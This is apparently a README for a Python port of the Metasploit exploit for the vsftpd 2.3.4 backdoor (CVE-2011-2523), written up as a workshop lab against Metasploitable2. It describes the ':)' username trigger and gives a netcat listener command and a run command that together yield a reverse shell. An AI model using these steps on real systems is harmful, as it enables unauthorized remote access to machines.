# The vsftpd-exploitation

The following is rewritten old exploit (Metasploit) for the vulnerable FTPD service based on the `stfpd 2.3.4 Backdoor command execution` exploit available in the framework.

According to Metasploit, this module "exploits a malicious backdoor that was added to the VSFTPD download archive"

The original file is the `17491.rb` (Ruby file), which besides containing all the required `Metasploit` framework structure, performs a TCP socket connection to the `port 6200`, checks the service banner, and programmatically sends additional characters `:)` to the service authentication mechanism. After a response, you can later connect to the backdoor, and a command prompt is generated.

This ruby file has a `handle_backdoor` function which acts as an interpreter for the reverse shell generated.

The `vsftpd.py` script is a simple abstraction of the mentioned exploit module with all the same functionality but removes all the Metasploit framework definitions and adaptions to the framework.

This file performs an FTP connection (port 21), performs a service comparison (banners), adds the username with the `:)` to the `USER` FTP prompt for breaking the program, this allows blank passwords. At this point, an `id` command comparison is made and the payload is injected and backdoor connections can be generated.

This old exploit was reported in the `CVE 2011-2523`.

This practice was performed in a secure environment (workshop)

## Exploit used

In a Kali environment, the exploit is found in the `/usr/share/exploitdb/exploits/unix/remote/17491.rb` file. In Metasploit is found in the `exploit/unix/remote/17491.rb` mechanism

## Lab

The vulnerable service with the exact version is present in the `Metasploitable2` machine.

## Run

1. You will need a `netcat` listener on the attacker machine: `nc -lvp [port] (default 4444)` (this is for the reverse shell session)
2. Run the program like this: `python -r [Attacker IP] -p [port] [Target IP]`.

If no `-i` are sent, an reverse shell should be generated in the attacker machine.
